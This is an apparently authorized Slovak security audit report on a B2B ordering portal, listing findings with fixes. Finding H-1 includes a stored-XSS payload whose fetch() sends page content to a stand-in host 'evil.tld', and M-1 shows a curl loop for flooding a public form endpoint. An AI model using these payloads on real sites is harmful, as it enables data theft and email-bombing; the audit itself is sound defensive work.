# 🛡️ Bezpečnostný audit — Moonid B2B portál

> **Cieľ:** `https://moonid-b2b-portal.vercel.app/`
> **Backend:** Supabase (PostgreSQL 17, projekt `gckvseqlaxydsbutsjhm`, eu-central-1)
> **Hosting:** Vercel (región fra1)
> **Dátum auditu:** 2026-06-29
> **Typ:** Autorizovaný white-box audit (zdrojový kód + živá infraštruktúra, výhradne read-only)
> **Mandát:** Vlastná infraštruktúra zadávateľa, explicitná žiadosť. Žiadne deštruktívne testy, DoS ani modifikácie.

---

## Obsah
1. [Metodika](#1-metodika)
2. [Executive summary](#2-executive-summary)
3. [Aplikovateľné štandardy](#3-aplikovateľné-štandardy)
4. [Nálezy podľa závažnosti](#4-nálezy-podľa-závažnosti)
5. [Moderné hrozby 2026](#5-moderné-hrozby-2026)
6. [Pozitívne zistenia](#6-pozitívne-zistenia)
7. [Rozsah a obmedzenia](#7-rozsah-a-obmedzenia)

---

## 1. Metodika

- **Statická analýza** zdrojového kódu — 8 paralelných bezpečnostných domén (autorizácia/IDOR, autentifikácia/session, injekcie, biznis logika, neautentifikované vstupy, tajomstvá/závislosti, dátová vrstva, klientska expozícia), 54 agentov, s adversariálnym overovaním každého nálezu opätovným čítaním kódu.
- **Živé read-only testy** Supabase Data API a RPC (REST `apikey` testy s verejným anon kľúčom).
- **DB introspekcia** — granty (`information_schema`, `has_table_privilege`, `has_function_privilege`), RLS politiky (`pg_policies`), `SECURITY DEFINER` funkcie + `search_path` (`pg_proc`), triggery (`pg_trigger`), Storage buckety.
- **Analýza HTTP hlavičiek** nasadeného webu (CSP, HSTS, CORS, cookie flags).

Finálne závažnosti zohľadňujú výsledok adversariálneho overenia (downgrade/vyvrátenie nadhodnotených nálezov).

---

## 2. Executive summary

Portál je **bezpečnostne nadpriemerne dobre postavený**. Architektonické rozhodnutia sú správne: dáta tečú výhradne cez Prisma (server-side), ceny a autorizácia sa počítajú na serveri, multi-tenant izolácia firiem je dôsledná, tajomstvá nie sú v gite a HTTP hlavičky sú prísne. **Nenašiel sa žiadny kritický ani aktívne zneužiteľný anonymný únik dát.**

| Závažnosť | Počet | Najdôležitejšie |
|---|---|---|
| 🔴 Kritická | 0 | — |
| 🟠 Vysoká | 1 | Stored XSS cez JSON-LD breakout na verejnej stránke produktu (H-1) |
| 🟡 Stredná | 4 | Chýbajúci rate-limiting (M-1); slabá server-side politika hesiel (M-2); latentná „kolapsovateľnosť" dátovej vrstvy (M-3); CSP `unsafe-inline` (M-4) |
| 🔵 Nízka | 9 | Granularita rolí, audit `TRUNCATE`, predvídateľné čísla objednávok, `/api/img` hardening… |

**Tri veci na okamžité riešenie:**
1. **Escapovať JSON-LD** (jediný „Vysoký", oprava ~10 riadkov).
2. **Zaviesť rate-limiting** na verejné endpointy (`/api/dopyt`, registrácia, login/reset).
3. **Zatvoriť latentné DB míny** — `REVOKE EXECUTE … FROM PUBLIC` + `ENABLE RLS` (celá ochrana dnes visí na jednom Supabase nastavení).

---

## 3. Aplikovateľné štandardy

- **OWASP Top 10 2021** + **OWASP ASVS 4.0** — primárny rámec.
- **ISO/IEC 27001/27002** — Annex A (riadenie prístupu, kryptografia, logovanie, konfigurácia).
- **GDPR** — **uplatňuje sa.** Portál spracúva osobné údaje (e-maily, firemné údaje, dodacie adresy, história objednávok, IP v audite).
- **PCI-DSS** — **NEuplatňuje sa.** Portál nespracúva platobné karty; fakturácia a úhrady prebiehajú v systéme Pohoda mimo portálu (potvrdené absenciou akéhokoľvek platobného kódu). Ak by portál v budúcnosti spracúval karty, audit treba zopakovať.

---

## 4. Nálezy podľa závažnosti

### 🟠 VYSOKÁ

#### H-1 — Stored XSS cez `</script>` breakout v JSON-LD (verejná stránka produktu)

| | |
|---|---|
| **Kategória** | Cross-Site Scripting (stored, script-context injection) — CWE-79 |
| **Závažnosť** | Vysoká |
| **Miesto** | `app/produkt/[slug]/page.tsx:70-77` (zostavenie `ld`), `:203` (`dangerouslySetInnerHTML`). Zdroj dát: `app/staff/katalog/actions.ts:109-146` + Pohoda/dodávateľský feed |
| **Confidence** | vysoká (potvrdené priamym čítaním kódu) |

**Technické vysvetlenie:** Objekt `ld` (polia `name`, `sku`, `brand.name`, `gtin13`, `description`) sa renderuje cez `JSON.stringify(ld)` do `<script type="application/ld+json">`. `JSON.stringify` **neescapuje** `<`, `>` ani `/`. Normalizácia `descriptionLong.replace(/\s+/g," ")` odstráni len biele znaky — reťazec `</script>` prežije. HTML parser ukončí JSON-LD blok pri `</script>` a všetko za ním parsuje ako HTML. Rovnaký vzor je v `app/layout.tsx:65` a `components/site/sections.tsx:394` (dnes statické dáta = bezpečné, ale konzistentne opraviť).

**Príklad exploitácie (PoC, bez spustenia):** Do `descriptionLong` (alebo `name`/`brand`) produktu sa uloží:
```
Kvalitný gél</script><script>fetch('https://evil.tld/x?c='+encodeURIComponent(document.body.innerHTML))</script>
```
Po otvorení `/produkt/<slug>` sa skript vykoná u každého návštevníka.

**Dopad:** Exfiltrácia obsahu stránky, akcie v mene obete v rámci origin (XSS obíde SameSite), keylogging na prihlasovacom formulári, defacement. Session cookie je `HttpOnly` (čiastočná mitigácia — `document.cookie` ho neprečíta), no útočník stále koná ako obeť.

**Vektory:** (a) **Insider** — ktorýkoľvek STAFF účet; (b) **Supply-chain** — kompromitovaný/škodlivý dodávateľský feed (humed.sk / Google Merchant).

**Náprava:**
```ts
// lib/json-ld.ts
export function safeJsonLd(obj: unknown): string {
  return JSON.stringify(obj)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    .replace(/ /g, "\\u2028")
    .replace(/ /g, "\\u2029");
}
// použitie (všetky 3 miesta):
<script type="application/ld+json" dangerouslySetInnerHTML={{ __html: safeJsonLd(ld) }} />
```
Doplnkovo: pri uložení produktu strip-núť `<`/`>` z textových polí; dlhodobo nonce-based CSP (M-4).

**Štandardy:** OWASP A03:2021; ASVS 5.3.1/5.3.3; ISO 27002 A.8.28; GDPR čl. 32.

---

### 🟡 STREDNÁ

#### M-1 — Chýbajúci rate-limiting na verejných endpointoch

| | |
|---|---|
| **Kategória** | Unrestricted Resource Consumption / DoS / Abuse of functionality — OWASP API4:2023 |
| **Závažnosť** | Stredná |
| **Miesto** | `app/api/dopyt/route.ts:24-73`; `app/registracia/actions.ts:20-62`; `app/(auth)/login/login-form.tsx:26-41`; `app/(auth)/zabudnute-heslo/*` |

**Technické vysvetlenie:** Žiadny aplikačný rate-limit. Tri problémy:
1. **`/api/dopyt`** — `originOk()` vracia `true` keď chýba `Origin` hlavička (`:26`). Skript bez `Origin` (curl) obíde kontrolu → neobmedzené e-maily cez Resend + INSERT do `AuditLog` za každý request.
2. **`createAccessRequest`** (registrácia) — verejná Server Action bez auth; každé volanie = `AccessRequest` riadok + e-mail + audit. Bez `@unique` na e-mail/IČO.
3. **Login/reset** — `signInWithPassword`/reset z klienta; chráni len default per-IP limit Supabase GoTrue (nedostatočné proti distribuovanému stuffingu; B2B e-maily predvídateľné).

**Príklad exploitácie:**
```bash
for i in $(seq 1 100000); do
  curl -s -X POST .../api/dopyt -H 'Content-Type: application/json' \
    -d '{"meno":"a","firma":"bb","email":"x@x.sk","gdpr":true}'
done
```
→ email-bombing inboxu, vyčerpanie Resend kvóty, poškodenie reputácie domény, nafúknutie audit logu.

**Dopad:** Prevádzkový (DoS inboxu, náklady, reputácia), otrava brute-force detekcie, spam v DB. Nie únik dát.

**Náprava:**
- Per-IP a per-email/IČO rate-limit (`@upstash/ratelimit` + Vercel KV, alebo **Vercel Firewall** rate-limit rules — bez kódu).
- V `/api/dopyt`: odmietnuť POST s chýbajúcim `Origin` (403).
- CAPTCHA/Turnstile na `/api/dopyt`, registráciu, login a reset (Supabase má vstavanú podporu hCaptcha/Turnstile).
- Deduplikácia `PENDING` `AccessRequest` (unique partial index).

**Štandardy:** OWASP A04:2021, API4:2023; ASVS 2.2.1, 11.2; ISO 27002 A.8.6; GDPR čl. 5(1)(f).

---

#### M-2 — Slabá server-side politika hesiel + chýbajúca ochrana proti brute-force

| | |
|---|---|
| **Kategória** | Identification and Authentication Failures |
| **Závažnosť** | Stredná |
| **Miesto** | `app/(auth)/nastav-heslo/set-password-form.tsx:8-48`; Supabase Auth „Leaked password protection" = **VYPNUTÉ** |

**Technické vysvetlenie:** Minimálna dĺžka 12 a HIBP kontrola (`isPwned`) sú vynútené **len v React komponente** pred `supabase.auth.updateUser({password})`. `isPwned()` je fail-open. Pri vypnutej Supabase ochrane je server-side minimum len 6 znakov a kontrola uniknutých hesiel žiadna — používateľ vie nastaviť slabé/uniknuté heslo priamym volaním `PUT /auth/v1/user` alebo úpravou JS.

**Dopad:** Nepriame — zvyšuje úspešnosť následného credential-stuffingu/brute-force (spolu s M-1).

**Náprava:** V Supabase Auth zapnúť **Leaked password protection (HIBP)** a nastaviť **minimálnu dĺžku/silu hesla server-side**. Klientskú kontrolu ponechať ako UX. Zvážiť MFA (schéma `User.mfaEnabled` už existuje, dnes `false`).

**Štandardy:** OWASP A07:2021; ASVS 2.1.x, 2.2.1; ISO 27002 A.5.17.

---

#### M-3 — Latentná „kolapsovateľnosť" dátovej vrstvy: RLS vypnuté + PUBLIC EXECUTE na definer funkciách

| | |
|---|---|
| **Kategória** | Broken Access Control / Defense-in-depth / Excessive Privilege |
| **Závažnosť** | Stredná (latentné; dopad pri spustení vysoký) |
| **Miesto** | celá schéma `public` (26 tabuliek bez RLS, žiadne policies); `database/pohoda-agent.sql:30-124` |

**Technické vysvetlenie (overené na živo):** Dnes je expozícia cez Supabase Data API **nulová** — tri nezávislé fakty:
- `anon`/`authenticated` nemajú `SELECT/INSERT/UPDATE/DELETE` na žiadnej `public` tabuľke (`has_table_privilege` = false).
- Schéma `public` **nie je vystavená** cez PostgREST (`PGRST106: "Only the following schemas are exposed: graphql_public"`).
- Dáta idú výhradne cez Prisma privilegovanou rolou.

**Ale** sú tu dve míny:
1. RLS je vypnuté na všetkých 26 tabuľkách (nulová poistka na DB úrovni).
2. `anon`/`authenticated` **majú `EXECUTE`** (default PUBLIC grant nebol odobraný — `has_function_privilege` = true) na `SECURITY DEFINER` funkciách vrátane **mutujúcich** `pohoda_ingest_invoices`, `pohoda_ingest_stock`, `rls_auto_enable`. RPC volanie potrebuje len `EXECUTE` + exponovanú schému (nie SELECT grant).

**Prepnutie jediného settingu** („expose public schema" v Data API) by okamžite umožnilo anonymné volanie `rpc/pohoda_ingest_invoices` → vkladanie falošných faktúr/skladu s právami vlastníka funkcie.

**Príklad exploitácie (podmienený):** Ak by ktokoľvek pridal `public` do exposed schemas (alebo skopíroval bežný „fix" `GRANT … TO anon`): `POST /rest/v1/rpc/pohoda_ingest_invoices` s verejným anon kľúčom → injekcia dokladov.

**Náprava:**
```sql
-- 1) Odobrať default PUBLIC EXECUTE z definer funkcií; ponechať len agentovi
REVOKE EXECUTE ON FUNCTION
  public.pohoda_ingest_invoices(jsonb, timestamptz),
  public.pohoda_ingest_stock(jsonb, timestamptz),
  public.pohoda_heartbeat(text, boolean),
  public.pohoda_get_cursors(),
  public.rls_auto_enable()
FROM PUBLIC, anon, authenticated;

-- 2) Poistka: ENABLE RLS (default-deny) na všetkých app tabuľkách.
--    Prisma privilegovaná rola RLS obchádza → app funguje ďalej.
ALTER TABLE public."User" ENABLE ROW LEVEL SECURITY;  -- atď. pre všetkých 26
```
+ CI kontrola, že `anon`/`authenticated` nikdy nedostanú DML granty a `public` ostane nevystavená.
Dokumentácia: <https://supabase.com/docs/guides/database/postgres/row-level-security>

**Štandardy:** OWASP A01:2021, A05:2021; ASVS V4.1; ISO 27001 A.8.2/A.8.3/A.5.15; GDPR čl. 32; CIS PostgreSQL Benchmark.

---

#### M-4 — CSP `script-src 'unsafe-inline'` oslabuje obranu proti XSS

| | |
|---|---|
| **Kategória** | Security Misconfiguration (CSP) — CWE-1021/693 |
| **Závažnosť** | Stredná |
| **Miesto** | `next.config.ts:15` (vlastný TODO na `:7`) |

**Technické vysvetlenie:** `'unsafe-inline'` v `script-src` neutralizuje hlavný prínos CSP — pri XSS regresii (ako H-1) by injektovaný inline `<script>` prešiel; nonce-based CSP by ho zablokoval. Ostatné direktívy sú prísne (`object-src 'none'`, `base-uri 'self'`, `frame-ancestors 'none'`, `form-action 'self'`).

**Náprava:** Prejsť na nonce-based `script-src 'nonce-<rnd>' 'strict-dynamic'`, odstrániť `'unsafe-inline'` zo `script-src`. `style-src 'unsafe-inline'` je menej kritické, môže zostať.

**Štandardy:** OWASP A05:2021 (+A03); ASVS 14.4.3; ISO 27002 A.8.9.

---

### 🔵 NÍZKA

| ID | Nález | Miesto | Podstata & náprava |
|---|---|---|---|
| **L-1** | STAFF a ADMIN sú jedna úroveň — chýba segregácia povinností | `lib/auth.ts:24`; staff actions | `isStaff()` spája STAFF+ADMIN; `requireAdmin()` existuje, ale **nikde sa nepoužíva**. Každý STAFF má plný zápis do cenotvorby/katalógu. → vyhradiť cenotvorbu/zakladanie produktov pre `requireAdmin()`, alebo zdokumentovať ako zámer (malý tím). |
| **L-2** | Audit log: append-only nepokrýva `TRUNCATE` + lock mimo migrácie | `database/audit-append-only.sql` | Triggery blokujú `UPDATE`/`DELETE`, ale **nie `TRUNCATE`** (`pg_trigger`), a `TRUNCATE` je grantnutý široko. Lock sa aplikuje ručným `npm run audit:lock`, nie cez `prisma migrate`. → `CREATE TRIGGER … BEFORE TRUNCATE ON "AuditLog"` + `REVOKE TRUNCATE/UPDATE/DELETE ON "AuditLog" FROM PUBLIC, anon, authenticated, service_role`; presunúť do migrácie + CI kontrola. |
| **L-3** | Predvídateľné sekvenčné čísla objednávok (BI leak) | `app/(portal)/kosik/actions.ts:190` | `WEB-2026-00001…` globálne sekvenčné → zákazník odvodí objem objednávok. **Nie IDOR** (prístup cez cuid + companyId scoping). → ak je objem citlivý, použiť nenásledný identifikátor; inak akceptovať. |
| **L-4** | `/api/img`: `fetch` bez timeoutu + `redirect:'follow'` | `app/api/img/route.ts:25` | Anti-SSRF jadro **solídne** (staff-only, fixný host, https, opaque id), ale chýba `AbortController` timeout + `redirect:'manual'`. → doplniť timeout, manual redirect, limit veľkosti, kontrolu `content-type: image/*`. |
| **L-5** | `recordLoginFailure` je verejne volateľná Server Action | `app/(auth)/actions.ts:16-20` | Ktokoľvek generuje `LOGIN_FAILURE` audit záznamy s ľubovoľnými e-mailmi → otrava detekcie, rast úložiska. → generovať server-side z reálneho pokusu (Supabase Auth hook), alebo rate-limit. |
| **L-6** | Wildcard v `images.remotePatterns` (`*.supabase.co`) | `next.config.ts:43` | Optimizer môže proxovať obrázky z cudzích Supabase projektov (bandwidth/cache abuse). → zúžiť na `<ref>.supabase.co` + `pathname:/storage/v1/object/public/**`. |
| **L-7** | TOCTOU: `Cart.companyId` bez `@unique` → duplicitné košíky | `lib/cart.ts:7-11` | `findFirst`→`create` bez zámku. **Data-integrity/UX, nie bezpečnosť.** → `@unique` na `Cart.companyId` + `upsert`. |
| **L-8** | CLI `create-admin.ts` vypisuje dočasné heslo do konzoly | `scripts/auth/create-admin.ts:58` | Heslo v termináli/CI logoch. → vypisovať jednorazový odkaz / vynútiť reset pri prvom prihlásení. |
| **L-9** | „Zapamätať si ma" je nefunkčné (kozmetické) | `app/(auth)/login/login-form.tsx:56-60` | Checkbox bez `name`/`onChange` — hodnota sa nečíta. → odstrániť alebo implementovať. |

---

## 5. Moderné hrozby 2026

- **AI-poháňané/automatizované útoky:** Absencia rate-limitingu (M-1) robí portál ľahkým cieľom pre boty — credential-stuffing na login, hromadné odosielanie cez `/api/dopyt`, spam registrácií. CAPTCHA/Turnstile + per-IP limity sú primárna obrana.
- **Supply-chain:** Konkrétny vektor je H-1 — produktové dáta z dodávateľského feedu idú na verejnú stránku; otrávený feed = stored XSS. Dependency supply-chain je v dobrom stave (aktuálne verzie, `.gitignore` chráni tajomstvá).
- **Cloud-specifické:** Celá dátová izolácia visí na jednom Supabase nastavení (exposed schemas) — M-3. `service_role` kľúč je správne izolovaný v server-only module (`lib/supabase/admin.ts`).

---

## 6. Pozitívne zistenia (čo je urobené správne)

- ✅ **Next.js 15.5.19** — záplatované proti CVE-2025-29927 (middleware auth bypass).
- ✅ **Horizontálna izolácia firiem dôsledná** — každý dotaz podľa `id` filtruje na `user.companyId` zo session (objednávky, faktúry, košík, dodacie adresy, reorder).
- ✅ **Manipulácia cien nemožná** — cena/zľava/tier sa vždy počítajú server-side z DB; klient ich neposiela. Objednávky majú cenové snapshoty a transakčný anti-duplicitný guard.
- ✅ **Vertikálna autorizácia** — každý staff Server Action volá `requireStaff()` priamo (nie len v layoute).
- ✅ **Žiadne heslá v app DB** (auth v Supabase), default rola `CUSTOMER_USER`, `getUser()` server-side overenie, generické auth hlášky (žiadna enumerácia účtov), POST logout, robustný anti-open-redirect (`lib/safe-redirect.ts`).
- ✅ **Žiadne tajomstvá v gite**, `service_role` izolovaný, Sentry s PII scrubbing, `hidden-source-map` (žiadne verejné source mapy).
- ✅ **HTTP hlavičky:** HSTS preload, X-Frame-Options DENY, prísna CSP (okrem `unsafe-inline`), COOP/CORP, Permissions-Policy. `/api/img` korektný anti-SSRF. `SECURITY DEFINER` funkcie majú pinnutý `search_path`. Audit append-only trigger so `search_path=''`.
- ✅ **Parametrizovaný Prisma** — žiadny raw SQL z používateľského vstupu.

---

## 7. Rozsah a obmedzenia

- **Testované:** zdrojový kód (kompletný), DB schéma/granty/RLS/funkcie/triggery/storage (live introspekcia), HTTP hlavičky a Data API/RPC (live read-only).
- **Netestované (mimo bezpečného read-only mandátu):** aktívna exploitácia, penetračné testy s reálnymi payloadmi proti živej DB, fuzzing, load/DoS testy, Supabase Auth konfigurácia rate-limitov (nie je čitateľná cez MCP — overiť v dashboarde), reálny obsah dodávateľského feedu.
- Nálezy s nízkou istotou sú explicitne označené. PCI-DSS posúdené ako neaplikovateľné na základe absencie platobného kódu.

---

*Vygenerované ako súčasť autorizovaného bezpečnostného auditu. Súvisiaci akčný zoznam: [`SECURITY_AUDIT_REMEDIATION_CHECKLIST.md`](./SECURITY_AUDIT_REMEDIATION_CHECKLIST.md).*
